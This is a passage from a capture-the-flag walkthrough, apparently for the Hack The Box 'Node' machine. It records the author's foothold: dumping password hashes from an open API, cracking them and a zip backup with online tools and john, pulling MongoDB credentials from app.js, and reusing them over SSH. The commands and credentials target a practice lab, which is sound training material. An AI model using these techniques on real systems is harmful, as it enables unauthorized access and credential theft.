# Foothold

- We can write a python script to only return the endpoints which don't have the same content as the homepage. We get one hit: /users
![[Pasted image 20210331182923.png]]
- We get a JSON file from the users end point of the API
```bash
curl http://10.10.10.58:3000/api/users | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   611  100   611    0     0   1939      0 --:--:-- --:--:-- --:--:--  1945
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```
- Parsing for better readability:
```bash
cat users_api.json | grep username | awk -F: '{print $2}' | tr --delete ',' | tr --delete "\"" > users
cat users_api.json | grep password | awk -F: '{print $2}' | tr --delete ',' | tr --delete "\"" > passwords

paste -d ":" users passwords > creds && cat creds                                                          
 myP14ceAdm1nAcc0uNT: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
 tom: f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
 mark: de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
 rastating: 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0

```
- From the JSON file we can see that the admin is : myP14ceAdm1nAcc0uNT, but we can crack all the four passwords. The hases are SHA256.
- We can use hashcat to crack them or online tools. Using online tool.
```text
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake - mark
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester - myP14ceAdm1nAcc0uNT
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob - tom
```

- There is a backup file present for myplaceadmin. Other users have nothing on their login page.
- The backup file is base64 encoded, if we decode and store it in a file and run it against file again, we can see that it is a zip file, but password protected.
- We can use john to crack this.
```bash
zip2john > hash.txt
john --wordlist=$ROCK hash.txt

ng default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (new_file.zip)
1g 0:00:00:00 DONE (2021-03-31 18:59) 12.50g/s 2355Kp/s 2355Kc/s 2355KC/s sandrad..becky101
Use the "--show" option to display all of the cracked passwords reliably
Session completed

╭─norman@kali ~/Hack-The-Box/machines/node ‹main*› 
╰─$ john hash.txt --show                                                          
new_file.zip:magicword::new_file.zip:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve
-static/README.md, var/www/myplace/package-lock.json:new_file.zip


```

- We see the password is magicword
- In the zip file, we can see it is the source code of the webpage, app.js or some other conf file would have the database credentials.
- We can see it in app.js
```bash
cat app.js 

... [snip] ...
const url         = 'mongodb://mark:5AYRft73VtFpc84k:@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

... [snip] ...

```
- We can use this to login through SSH as there are cases of password reuse.
- We can get in as mark
```bash
 ssh mark@10.10.10.58                                                                                        130 ↵ 
mark@10.10.10.58's password:                                                                                          
                                                                                                                      
The programs included with the Ubuntu system are free software;                                                       
the exact distribution terms for each program are described in the                                                    
individual files in /usr/share/doc/*/copyright.                                                                       
                                                                                                                      
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by                                                  
applicable law.                                                                                                       
                                                                                                                      
              .-.                                                                                                     
        .-'``(|||)                                                                                                    
     ,`\ \    `-`.                 88                         88                                                      
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 

```
